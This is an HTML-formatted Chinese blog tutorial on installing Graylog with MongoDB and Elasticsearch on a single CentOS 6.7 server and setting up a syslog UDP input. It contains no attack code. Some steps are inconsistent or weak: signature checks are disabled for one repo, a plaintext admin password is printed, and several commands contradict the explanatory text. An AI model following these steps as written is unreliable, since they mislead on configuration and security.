&lt;figure class=&quot;highlight arduino&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;Graylog &lt;span class=&quot;built_in&quot;&gt;Server&lt;/span&gt;：这个服务负责接收和处理日志/消息，并且和其他组件沟通。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Elasticsearch：存储所有的日志，它的性能依赖内存和硬盘IO。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;MongoDB：存储元数据，负载不高。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;graylog-Web接口：用户接口。&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;下面是Graylog组件之间的关系图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;下面来自我公司内部分享的PPT拍图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Graylog4-ppt.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;生产环境 我参考网上一些博客画的图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog5.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;系统要求：&quot;&gt;&lt;a href=&quot;#系统要求：&quot; class=&quot;headerlink&quot; title=&quot;系统要求：&quot;&gt;&lt;/a&gt;系统要求：&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;CentOS 6.7&lt;/li&gt;
&lt;li&gt;内存至少2GB&lt;/li&gt;
&lt;li&gt;有root权限&lt;/li&gt;
&lt;li&gt;服务器ip是192.168.1.234，已安装 1.8.0_77-b03&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这里我只是举例单一模式跑服务。&lt;/p&gt;
&lt;h3 id=&quot;安装MongoDB&quot;&gt;&lt;a href=&quot;#安装MongoDB&quot; class=&quot;headerlink&quot; title=&quot;安装MongoDB&quot;&gt;&lt;/a&gt;安装MongoDB&lt;/h3&gt;&lt;p&gt;MongoDB的安装非常简单，执行如下命令导入MongoDB GPG密钥到rpm：&lt;/p&gt;
&lt;figure class=&quot;highlight yaml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog yum.repos.d]&lt;span class=&quot;comment&quot;&gt;# vim /etc/yum.repos.d/mongodb-org-3.0.repo&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[mongodb-org&lt;span class=&quot;bullet&quot;&gt;-3.0&lt;/span&gt;]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;name=MongoDB Repository&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;baseurl=http://repo.mongodb.org/yum/redhat/$releasever/mongodb-org/&lt;span class=&quot;number&quot;&gt;3.0&lt;/span&gt;/x86_64/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;gpgcheck=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;enabled=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog yum.repos.d]&lt;span class=&quot;comment&quot;&gt;# yum install -y mongodb-org&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog yum.repos.d]&lt;span class=&quot;comment&quot;&gt;# vi /etc/yum.conf&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;最后一行添加：&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;exclude=mongodb-org,mongodb-org-server,mongodb-org-shell,mongodb-org-mongos,mongodb-org-tools&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog yum.repos.d]&lt;span class=&quot;comment&quot;&gt;# service mongod start&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog yum.repos.d]&lt;span class=&quot;comment&quot;&gt;# chkconfig mongod on&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog yum.repos.d]&lt;span class=&quot;comment&quot;&gt;# vi /etc/security/limits.conf&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;最后一行添加：&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;*                soft    nproc           &lt;span class=&quot;number&quot;&gt;65536&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;*                hard    nproc           &lt;span class=&quot;number&quot;&gt;65536&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;mongod           soft    nproc           &lt;span class=&quot;number&quot;&gt;65536&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;*                soft    nofile          &lt;span class=&quot;number&quot;&gt;131072&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;*                hard    nofile          &lt;span class=&quot;number&quot;&gt;131072&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# vi /etc/init.d/mongod&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ulimit -f unlimited 行前插入：&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  if test -f /sys/kernel/mm/transparent_hugepage/enabled; then&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    echo never &amp;gt; /sys/kernel/mm/transparent_hugepage/enabled&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  fi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  if test -f /sys/kernel/mm/transparent_hugepage/defrag; then&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    echo never &amp;gt; /sys/kernel/mm/transparent_hugepage/defrag&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  fi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;---&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog ~]&lt;span class=&quot;comment&quot;&gt;# /etc/init.d/mongod restart&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;安装Elasticsearch&quot;&gt;&lt;a href=&quot;#安装Elasticsearch&quot; class=&quot;headerlink&quot; title=&quot;安装Elasticsearch&quot;&gt;&lt;/a&gt;安装Elasticsearch&lt;/h3&gt;&lt;p&gt;Graylog目前为止只能使用Elasticsearch 2.0以前的版本，所以，在这一步中，我将安装Elasticsearch 1.7.x。&lt;/p&gt;
&lt;p&gt;添加Elasticsearch GPG密钥：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo rpm --import http://packages.elastic.co/GPG-KEY-elasticsearch
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;创建Elasticsearch源：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo vim /etc/yum.repos.d/elasticsearch.repo
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;写入如下内容：&lt;/p&gt;
&lt;figure class=&quot;highlight ini&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;section&quot;&gt;[elasticsearch-1.7]&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;name&lt;/span&gt;=Elasticsearch repository for &lt;span class=&quot;number&quot;&gt;1.7&lt;/span&gt;.x packages&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;baseurl&lt;/span&gt;=http://packages.elastic.co/elasticsearch/&lt;span class=&quot;number&quot;&gt;1.7&lt;/span&gt;/centos&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;gpgcheck&lt;/span&gt;=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;gpgkey&lt;/span&gt;=http://packages.elastic.co/GPG-KEY-elasticsearch&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;enabled&lt;/span&gt;=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;安装Elasticsearch：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo yum -y install elasticsearch
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;配置前先创建几个目录文件&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mkdir /data/es-data -p
mkdir /data/es-work -p
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Elasticsearch安装完成之后，编辑配置文件：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo vim /etc/elasticsearch/elasticsearch.yml

 node.data: true  # 数据存放true
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;找到cluster.name一行，取消这一行的注释，并把值改为graylog-development：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cluster.name: graylog-development


 path.data: /data/es-data     es数据存放目录  这里需要自己新建目录

 path.work: /data/es-work   
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;你也许想要限制外部访问Elasticsearch（端口9200），这样可以提高系统的安全性。找到network.host一行，取消注释，并把值改为localhost：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;network.host: 192.168.1.234
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;保存退出文件。&lt;/p&gt;
&lt;p&gt;重启Elasticsearch：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ service elasticsearch start
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;设置开机启动：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ chkconfig --add elasticsearch
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行如下命令测试Elasticsearch是否正常运行：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ curl -XGET &amp;apos;http://localhost:9200/_cluster/health?pretty=true&amp;apos;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;输出的信息如下表示Elasticsearch安装成功：&lt;/p&gt;
&lt;figure class=&quot;highlight autoit&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;drwxr-xr-x. &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; root   root  &lt;span class=&quot;number&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;月  &lt;span class=&quot;number&quot;&gt;23&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2011&lt;/span&gt; src&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root&lt;span class=&quot;symbol&quot;&gt;@ELK&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;local&lt;/span&gt;]&lt;span class=&quot;meta&quot;&gt;#  curl -XGET &lt;span class=&quot;string&quot;&gt;&#39;http://192.168.1.234:9200/_cluster/health?pretty=true&#39;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;cluster_name&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;graylog-development&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;status&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;yellow&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;timed_out&quot;&lt;/span&gt; : &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;number_of_nodes&quot;&lt;/span&gt; : &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;number_of_data_nodes&quot;&lt;/span&gt; : &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;active_primary_shards&quot;&lt;/span&gt; : &lt;span class=&quot;number&quot;&gt;37&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;active_shards&quot;&lt;/span&gt; : &lt;span class=&quot;number&quot;&gt;37&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;relocating_shards&quot;&lt;/span&gt; : &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;initializing_shards&quot;&lt;/span&gt; : &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;unassigned_shards&quot;&lt;/span&gt; : &lt;span class=&quot;number&quot;&gt;37&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;delayed_unassigned_shards&quot;&lt;/span&gt; : &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;number_of_pending_tasks&quot;&lt;/span&gt; : &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;number_of_in_flight_fetch&quot;&lt;/span&gt; : &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;安装Graylag&lt;/p&gt;
&lt;p&gt;Graylog的最新版是1.1.4，下载链接如下：&lt;br&gt;&lt;a href=&quot;https://packages.graylog2.org/repo/el/6Server/1.1/x86_64/graylog-server-1.1.4-1.noarch.rpm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://packages.graylog2.org/repo/el/6Server/1.1/x86_64/graylog-server-1.1.4-1.noarch.rpm&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://packages.graylog2.org/repo/el/6Server/1.1/x86_64/graylog-web-1.1.4-1.noarch.rpm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://packages.graylog2.org/repo/el/6Server/1.1/x86_64/graylog-web-1.1.4-1.noarch.rpm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;现在Graylog的所有依赖软件安装完成，这一步我们来安装graylog-server。&lt;/p&gt;
&lt;p&gt;首先，下载Graylog RPM软件包：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ cd 
$ sudo rpm -Uvh https://packages.graylog2.org/repo/packages/graylog-1.3-repository-el7_latest.rpm
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;安装graylog-server：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;yum -y install graylog-server
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;安装pwgen，我们使用它生成随机密码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;yum -y install epel-release
yum -y install pwgen
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;现在我们来设置Graylog管理员的密钥。配置文件位于/etc/graylog/server/server.conf目录，需要修改password_secret参数：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ SECRET=$(pwgen -s 96 1)
$ sudo -E sed -i -e &amp;apos;s/password_secret =.*/password_secret = &amp;apos;$SECRET&amp;apos;/&amp;apos; /etc/graylog/server/server.conf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行完上面命令之后，password_secret参数的样子：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog6.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这一步，设置管理员密码。由于密码使用sha哈希算法，我们需要把明文密码转换为hash，然后赋值给root_password_sha2参数。例如，我要设置的管理员密码是 Ihaozhuo_b313，它对应的hash为：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ echo -n Ihaozhuo_b313 | sha256sum | awk &amp;apos;{print $1}&amp;apos;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog7.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;编辑/etc/graylog/server/server.conf，设置root_password_sha2参数：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo vim /etc/graylog/server/server.conf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog8.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;现在Graylog管理员密码为Ihaozhuo_b313。&lt;/p&gt;
&lt;p&gt;配置rest_transport_uri参数，设置Graylog web接口和服务器的沟通方式。由于我们把所有组件都安装到了单独的一个服务器上，需要把值设置为&lt;strong&gt;127.0.0.1&lt;/strong&gt; 或 &lt;strong&gt;localhost&lt;/strong&gt;。找到rest_transport_uri一行，取消注释，并把值设置为：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;rest_transport_uri = http://192.168.1.234:12900/
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;由于我们只有一个Elasticsearch shard，需要把elasticsearch_shards参数设置为1：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;elasticsearch_shards = 1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;更改elasticsearch_cluster_name参数，应该和前面Elasticsearch的&lt;strong&gt;cluster.name&lt;/strong&gt;参数相对应：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;elasticsearch_cluster_name = graylog-development
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog9.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;取消下面两行的注释，检测Elasticsearch：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;172 elasticsearch_discovery_zen_ping_multicast_enabled = false
173 elasticsearch_discovery_zen_ping_unicast_hosts = 192.168.1.234:9300
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;启动graylog-server：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/etc/init.d/graylog-web restart
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;安装Graylog-Web&quot;&gt;&lt;a href=&quot;#安装Graylog-Web&quot; class=&quot;headerlink&quot; title=&quot;安装Graylog Web&quot;&gt;&lt;/a&gt;安装Graylog Web&lt;/h3&gt;&lt;p&gt;安装Graylog Web：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo yum -y install graylog-web
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;安装完成之后配置Graylog Web的密钥，配置文件位于/etc/graylog/web/web.conf，更改application.secret参数：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ SECRET=$(pwgen -s 96 1)
$ sudo -E sed -i -e &amp;apos;s/application\.secret=&amp;quot;&amp;quot;/application\.secret=&amp;quot;&amp;apos;$SECRET&amp;apos;&amp;quot;/&amp;apos; /etc/graylog/web/web.conf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;配置graylog2-server.uris参数，它的值应该和Graylog的rest_listen_uri参数相对应：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo vim /etc/graylog/web/web.conf

graylog2-server.uris=&amp;quot;http://127.0.0.1:12900/&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;重启graylog-web：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/etc/init.d/graylog-web restart
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;配置Graylog服务器接收其他服务器的syslog日志&quot;&gt;&lt;a href=&quot;#配置Graylog服务器接收其他服务器的syslog日志&quot; class=&quot;headerlink&quot; title=&quot;配置Graylog服务器接收其他服务器的syslog日志&quot;&gt;&lt;/a&gt;配置Graylog服务器接收其他服务器的syslog日志&lt;/h3&gt;&lt;h4 id=&quot;登录Graylog-Web&quot;&gt;&lt;a href=&quot;#登录Graylog-Web&quot; class=&quot;headerlink&quot; title=&quot;登录Graylog Web&quot;&gt;&lt;/a&gt;登录Graylog Web&lt;/h4&gt;&lt;p&gt;使用浏览器访问Graylog服务器的域名或IP：&lt;strong&gt;&lt;a href=&quot;http://graylog_public_IP_domain:9000/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://graylog_public_IP_domain:9000/&lt;/a&gt;&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;你应该能看到一个登录界面，使用admin做为用户名和前面设置的密码登录。&lt;/p&gt;
&lt;p&gt;登录之后：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog10.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;上面的红数字1是通知（you have a node without any running inputs），下面设置通过UDP接收syslog。&lt;/p&gt;
&lt;p&gt;创建syslog UDP输入&lt;/p&gt;
&lt;p&gt;添加要接收的其他服务器syslog日志：System-&amp;gt;Inputs-&amp;gt;Syslog UDP-&amp;gt;Launch new input。&lt;/p&gt;
&lt;p&gt;在弹出的窗口上输入如下信息：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Title: syslog&lt;/li&gt;
&lt;li&gt;Port: 8514&lt;/li&gt;
&lt;li&gt;Bind address: 这里写Graylog-server服务器主机IP&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;点击Launch&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog11.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog12.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;如果你需要收集多个服务器的日志，重复上面步骤。&lt;/p&gt;
&lt;p&gt;现在，我们的Graylog服务器已经做好了接收其他服务器发来日志的准备。下面我们还需要配置其他服务器，让这些服务器给Graylog服务器发送日志。&lt;/p&gt;
